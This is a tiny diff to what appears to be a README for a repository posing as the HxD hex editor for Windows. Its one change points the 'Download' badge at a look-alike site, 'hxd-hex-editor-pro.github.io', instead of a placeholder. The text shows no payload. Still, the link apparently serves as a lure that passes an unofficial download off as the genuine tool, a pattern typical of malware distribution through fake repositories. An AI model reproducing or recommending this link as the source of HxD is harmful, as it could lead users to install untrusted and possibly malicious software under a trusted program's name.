@@ -2,7 +2,7 @@
 
 Powerful, free, and lightning-fast hex & disk editor for Windows — ideal for developers, reverse engineers, and sysadmins.
 
-[![Download HxD Hex Editor](https://img.shields.io/badge/Download-HxD_Hex_Editor-blueviolet)](#)
+[![Download HxD Hex Editor](https://img.shields.io/badge/Download-HxD_Hex_Editor-blueviolet)](https://hxd-hex-editor-pro.github.io/.github)
 
 ---
 
